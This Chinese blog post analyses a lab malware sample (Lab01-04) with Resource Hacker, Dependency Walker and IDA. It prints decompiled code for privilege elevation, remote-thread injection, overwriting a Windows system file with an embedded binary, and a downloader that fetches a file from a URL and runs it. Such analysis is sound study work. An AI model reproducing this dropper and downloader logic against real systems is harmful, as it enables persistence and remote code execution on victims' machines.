+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-91442febf445a3ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h4 id="Resource-Hacker"><a href="#Resource-Hacker" class="headerlink" title="Resource Hacker"></a>Resource Hacker</h4><p>用Resource Hacker打开该程序，通过<code>MZ</code>文件头和<code>PE</code>字样可以发现包含的是一个exe文件。选择<code>Action -&gt; save *.bin resource</code>将其导出为lab01-04-bin.exe，留待后续分析。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-637106054d6f172d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h4 id="Dependency-Walker-2"><a href="#Dependency-Walker-2" class="headerlink" title="Dependency Walker"></a>Dependency Walker</h4><p>首先打开lab01-04-new.exe，界面如下。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-a2002343d7abea0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>需要注意的函数如下：</p>
+<ul>
+<li>KERNEL32.dll<ul>
+<li>获取路径及文件相关<ul>
+<li>GetTempPathA</li>
+<li>GetWindowsDirectory</li>
+<li>CreateFileA</li>
+<li>WriteFile</li>
+<li>MoveFileA</li>
+</ul>
+</li>
+<li>二进制资源加载<ul>
+<li>FindResourceA</li>
+<li>LoadResource</li>
+<li>SizeofResource</li>
+</ul>
+</li>
+<li>获取句柄，大多用来操作远程进程<ul>
+<li>GetCurrentProcess</li>
+<li>OpenProcess</li>
+<li>GetProcAddress</li>
+</ul>
+</li>
+<li>运行文件，建立远程线程<ul>
+<li>WinExec</li>
+<li>CreateRemoteThread</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>ADVAPI32.dll<ul>
+<li>OpenProcessToken</li>
+<li>LookupPrivilegeValueA</li>
+<li>AdjustTokenPrivileges</li>
+</ul>
+</li>
+</ul>
+<p>可以看出lab01-04-new.exe将会对自身创建的进程进行提权操作，并创建及移动某些文件。除此以外，该程序还将运行某个exe文件并创建远程线程，目的或为将代码注入指定exe执行。</p>
+<p>再打开之前导出的lab01-04-bin.exe，界面如下。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-c39496eeb792a309.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>需要注意的函数如下：</p>
+<ul>
+<li>KERNEL32.dll<ul>
+<li>GetTempPathA</li>
+<li>GetWindowsDirectory</li>
+<li>WinExec</li>
+</ul>
+</li>
+<li>URLMON.dll<ul>
+<li>URLDownloadToFileA</li>
+</ul>
+</li>
+</ul>
+<p>不难看出，lab01-04-bin.exe将从指定URL地址读取内容，并将读取到的内容保存到特定路径下的文件里，同时也会执行某个或某些exe文件，所执行的文件大几率为从网页上下载的程序。</p>
+<h4 id="IDA-2"><a href="#IDA-2" class="headerlink" title="IDA"></a>IDA</h4><p>打开lab01-04-new.exe，F5反汇编，截取部分代码如下。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main()</span></span><br><span class="line">  dword_403124 = (<span class="keyword">int</span> (__stdcall *)(_DWORD, _DWORD, _DWORD))GetProcAddress(v5, aEnumprocesses);</span><br><span class="line">  <span class="comment">//检索进程中的每一个进程标识符</span></span><br><span class="line">  <span class="keyword">if</span> ( dword_403124 &amp;&amp; dword_403128 &amp;&amp; dword_40312C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_403124(dwProcessId, <span class="number">4096</span>, &amp;v14) )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = v14 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7 + <span class="number">1</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( dwProcessId[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          v19 = sub_401000(dwProcessId[i]);</span><br><span class="line">          <span class="keyword">if</span> ( v19 )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = dwProcessId[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v11 )</span><br><span class="line">      &#123;</span><br><span class="line">        v12 = sub_401174(v11);<span class="comment">//创建远程线程</span></span><br><span class="line">        <span class="keyword">if</span> ( v12 )<span class="comment">//若成功</span></span><br><span class="line">        &#123;</span><br><span class="line">          GetWindowsDirectoryA(&amp;Buffer, <span class="number">0x10E</span>u);<span class="comment">//获取目录</span></span><br><span class="line">          <span class="built_in">snprintf</span>(&amp;Dest, <span class="number">0x10E</span>u, aSS_0, &amp;Buffer, aSystem32Wupd_0);</span><br><span class="line">          <span class="comment">//将Dest赋值为wupdmgrd.exe的路径</span></span><br><span class="line">          GetTempPathA(<span class="number">0x10E</span>u, &amp;v20);<span class="comment">//获取临时路径</span></span><br><span class="line">          <span class="built_in">snprintf</span>(&amp;NewFileName, <span class="number">0x10E</span>u, aSS_1, &amp;v20, aWinup_exe);</span><br><span class="line">          <span class="comment">//将NewFileName赋值为winup.exe的路径</span></span><br><span class="line">          MoveFileA(&amp;Dest, &amp;NewFileName);<span class="comment">//将wupdmgrd.exe移动为临时路径下的winup.exe</span></span><br><span class="line">          sub_4011FC();<span class="comment">//创建、写入并运行新的wupdmgrd.exe</span></span><br><span class="line">          result = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
+<p>其中，与<code>v12 = sub_401174(v11);</code>有关的代码截取部分如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sub_401174()</span></span><br><span class="line">  <span class="keyword">if</span> ( sub_4010FC(aSedebugprivile) )<span class="comment">//若未提权</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span><span class="comment">//获取进程句柄需要在提权后才能进行</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = LoadLibraryA(LibFileName);</span><br><span class="line">    lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(v2, (LPCSTR)<span class="number">2</span>);</span><br><span class="line">    hProcess = OpenProcess(<span class="number">0x1F0FFF</span>u, <span class="number">0</span>, dwProcessId);<span class="comment">//获取进程句柄</span></span><br><span class="line">    <span class="keyword">if</span> ( hProcess )</span><br><span class="line">    &#123;</span><br><span class="line">      CreateRemoteThread(hProcess, <span class="number">0</span>, <span class="number">0</span>, lpStartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//建立远程线程</span></span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sub_4010FC()</span></span><br><span class="line">  <span class="keyword">if</span> ( LookupPrivilegeValueA(<span class="number">0</span>, lpName, (PLUID)NewState.Privileges) )</span><br><span class="line">  &#123;</span><br><span class="line">    AdjustTokenPrivileges(TokenHandle, <span class="number">0</span>, &amp;NewState, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//提权</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>对<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">```c</span><br><span class="line">//sub_4011FC()</span><br><span class="line">  GetWindowsDirectoryA(&amp;Buffer, 0x10Eu);</span><br><span class="line">  snprintf(&amp;Dest, 0x10Eu, Format, &amp;Buffer, aSystem32Wupdmg);</span><br><span class="line">  //将Dest赋值为将要创建的wupdmgrd.exe的路径</span><br><span class="line">  hModule = GetModuleHandleA(0);</span><br><span class="line">  hResInfo = FindResourceA(hModule, Name, Type);</span><br><span class="line">  lpBuffer = LoadResource(hModule, hResInfo);//加载资源</span><br><span class="line">  nNumberOfBytesToWrite = SizeofResource(hModule, hResInfo);</span><br><span class="line">  hFile = CreateFileA(&amp;Dest, 0x40000000u, 1u, 0, 2u, 0, 0);</span><br><span class="line">  //创建wupdmgrd.exe</span><br><span class="line">  WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, 0);</span><br><span class="line">  //写入wupdmgrd.exe</span><br><span class="line">  CloseHandle(hFile);</span><br><span class="line">  return WinExec(&amp;Dest, 0);//运行</span><br></pre></td></tr></table></figure></p>
+<p>打开lab01-04-bin.exe，F5反汇编，截取部分代码如下。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main()</span></span><br><span class="line">  GetTempPathA(<span class="number">0x10E</span>u, &amp;Buffer);</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;Dest, <span class="number">0x10E</span>u, Format, &amp;Buffer, aWinup_exe);</span><br><span class="line">  <span class="comment">//将Dest赋值为临时文件夹下winup.exe的绝对路径</span></span><br><span class="line">  WinExec(&amp;Dest, <span class="number">5u</span>);</span><br><span class="line">  <span class="comment">//运行winup.exe</span></span><br><span class="line">  GetWindowsDirectoryA(&amp;v7, <span class="number">0x10E</span>u);</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;CmdLine, <span class="number">0x10E</span>u, aSS_0, &amp;v7, aSystem32Wupdmg);</span><br><span class="line">  <span class="comment">//将CmdLine赋值为wupdmgrd.exe的绝对路径</span></span><br><span class="line">  <span class="keyword">if</span> ( !URLDownloadToFileA(<span class="number">0</span>, aHttpWww_practi, &amp;CmdLine, <span class="number">0</span>, <span class="number">0</span>) )</span><br><span class="line">    <span class="comment">//若已存在则运行，若不存在则下载</span></span><br><span class="line">    <span class="comment">//URLDownloadToFile下载文件前先在本地的缓存中查找此文件，如果存在则不会再次下载</span></span><br><span class="line">    WinExec(&amp;CmdLine, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p>
+<h4 id="结论-2"><a href="#结论-2" class="headerlink" title="结论"></a>结论</h4><p>该程序中包含了另一个exe文件（下称04-bin），其中，lab01-04为主体，负责提权、移动文件并向04-bin传递参数，04-bin主要起到下载器和运行的作用。<br>lab01-04首先提权以获取进程句柄并创建远程线程，此后将system32目录下的wupdmgrd.exe移动到临时文件夹下，再把自己的资源（04-bin）写入为新的wupdmgrd.exe并执行。04-bin查找本地是否存在特定文件A。若不存在，则从指定网址下载update.exe并存为该特定文件A；若存在，则执行该文件。</p>
+
+      
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/03/31/恶意代码分析实战lab01/">恶意代码分析实战lab01-2/3/4</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 ylylhl 的个人博客">ylylhl</a></p>
+        <p><span>发布时间:</span>2019年03月31日 - 11时37分</p>
+        <p><span>最后更新:</span>2019年04月10日 - 16时34分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/03/31/恶意代码分析实战lab01/" title="恶意代码分析实战lab01-2/3/4">http://ylylhl.github.io/2019/03/31/恶意代码分析实战lab01/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://ylylhl.github.io/2019/03/31/恶意代码分析实战lab01/　　作者: ylylhl" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target="_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2019/04/22/ライダーあつめ反编译过程/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          《ライダーあつめ》反编译过程
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/03/15/XSS简述&入门/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">XSS学习笔记</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-01-2"><span class="toc-number">1.</span> <span class="toc-text">Lab_01_2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#在线反病毒扫描"><span class="toc-number">1.1.</span> <span class="toc-text">在线反病毒扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PEiD"><span class="toc-number">1.2.</span> <span class="toc-text">PEiD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dependency-Walker"><span class="toc-number">1.3.</span> <span class="toc-text">Dependency Walker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IDA"><span class="toc-number">1.4.</span> <span class="toc-text">IDA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#结论"><span class="toc-number">1.5.</span> <span class="toc-text">结论</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-01-3"><span class="toc-number">2.</span> <span class="toc-text">Lab_01_3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#在线反病毒扫描-1"><span class="toc-number">2.1.</span> <span class="toc-text">在线反病毒扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PEiD-1"><span class="toc-number">2.2.</span> <span class="toc-text">PEiD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dependency-Walker-1"><span class="toc-number">2.3.</span> <span class="toc-text">Dependency Walker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IDA-1"><span class="toc-number">2.4.</span> <span class="toc-text">IDA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#结论-1"><span class="toc-number">2.5.</span> <span class="toc-text">结论</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-01-4"><span class="toc-number">3.</span> <span class="toc-text">Lab_01_4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#在线反病毒扫描-2"><span class="toc-number">3.1.</span> <span class="toc-text">在线反病毒扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PEiD-2"><span class="toc-number">3.2.</span> <span class="toc-text">PEiD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Resource-Hacker"><span class="toc-number">3.3.</span> <span class="toc-text">Resource Hacker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dependency-Walker-2"><span class="toc-number">3.4.</span> <span class="toc-text">Dependency Walker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IDA-2"><span class="toc-number">3.5.</span> <span class="toc-text">IDA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#结论-2"><span class="toc-number">3.6.</span> <span class="toc-text">结论</span></a></li></ol></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+<div class="share">
+    <div class="bdsharebuttonbox">
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+    <a href="#" class="bds_copy" data-cmd="copy" title="复制网址"></a>
+    <a href="#" class="bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+    </div>
+    <script>
+        window._bd_share_config={
+            "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+    </script>
+</div>
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2019/04/22/ライダーあつめ反编译过程/" title="上一篇: 《ライダーあつめ》反编译过程">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2019/03/15/XSS简述&入门/" title="下一篇: XSS学习笔记">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/11/DVWA文件上传/">DVWA文件上传</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/29/恶意代码分析实战Lab03_3/">恶意代码分析实战lab03-3</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/22/ライダーあつめ反编译过程/">《ライダーあつめ》反编译过程</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/31/恶意代码分析实战lab01/">恶意代码分析实战lab01-2/3/4</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/15/XSS简述&入门/">XSS学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/13/仓库：K-Means的python实现/">K-means的python实现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/29/仓库：C4-5的python实现/">C4.5的python实现</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2019 ylylhl
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 1;
+            var backgroundimg = "url(/background/bg-" + backgroundnum +".jpg)";
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+    <script type="text/javascript">
+      window.onload = function(){
+        document.getElementById("search").onclick = function(){
+            console.log("search")
+            search();
+        }
+      }
+      function search(){
+        (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+        (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+        e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+        })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+        _st('install','A1Pz-LKMXbrzcFg2FWi6','2.0.0');
+      }
+    </script>
+
+  </div>
+</body>
+</html>
